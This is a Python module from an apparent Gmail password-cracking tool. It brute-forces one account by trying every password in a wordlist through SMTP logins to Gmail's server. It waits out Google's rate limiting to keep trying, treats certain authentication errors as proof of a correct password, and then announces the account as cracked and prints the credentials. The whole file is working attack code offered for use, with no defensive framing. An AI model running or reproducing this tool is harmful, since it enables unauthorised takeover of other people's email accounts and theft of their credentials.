#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import smtplib
import time
from lib.showthing import  *
from lib.command import *
import codecs
import re

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.ehlo()

def login(email, password):
    global server
    user_name = email
    
    try:
        server.login(user_name, password)
        SysCleanScreen()
        InFo()
        printGreen ('[+]Account has been cracked!')
        ShowSucess(email, password)
        return 1
    except smtplib.SMTPAuthenticationError as e:
        error = str(e)
        if re.search('Username and Password not accepted', error) != None:
            return 0
        if re.search('Too many login attempts', error) != None:
            TryAgain(server)
            login(user_name, password)
        if (re.search('Application-specific password required', error) != None or
            re.search('Please log in via your web browser', error) != None or
            error[14] == '<'):
            SysCleanScreen()
            InFo()
            printGreen ('[+]Account has been cracked!')
            ShowSucess(email, password)
            return 1
        else:
            print('Error code: ' + error + '\n')
            printGreen ('[+]This is suspicious of being the correct password!')
            printGreen ('[+]Please check it out!')
            ShowSucess(email, password)
    except smtplib.SMTPServerDisconnected:
        TryAgain(server)
        login(user_name, password)

def TryAgain(server):
    print('[!]Tool is waiting for server...')
    server.close()
    time.sleep(60)
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()

class CGmail(object):
    def __init__(self,email,wordlist):
        self.email = email
        self.wordlist = wordlist

        try:
            fp = codecs.open(self.wordlist, "r", encoding='utf-8-sig')
            line = fp.readline()
            while line:
                try:
                    line = line.strip()
                    sys.stdout.write(' ' * 50 + '\r')
                    sys.stdout.flush()
                    sys.stdout.write('[!]Trying : ' + line + '\r')
                    sys.stdout.flush()
                    if login(self.email, line) == 1:
                        fp.close()
                        exit()
                        break
                    else:
                        line = fp.readline()
                except UnicodeDecodeError:
                    fp.seek(fp.tell()+1)
                    continue

            SysCleanScreen()
            InFo()
            printRed('Sorry~Looks like this wordlist file didn\'t include correct password.\n\nDon\'t forget to thank LBT ^_^')
            fp.close()
        except IOError:
            printRed('\nCan\'t open file:Nu such file:\n'+wordlist)
        #except:
            #printRed('Unknow Error')
            #sys.exc_info()
        finally:
            print ('\n\nbye~')

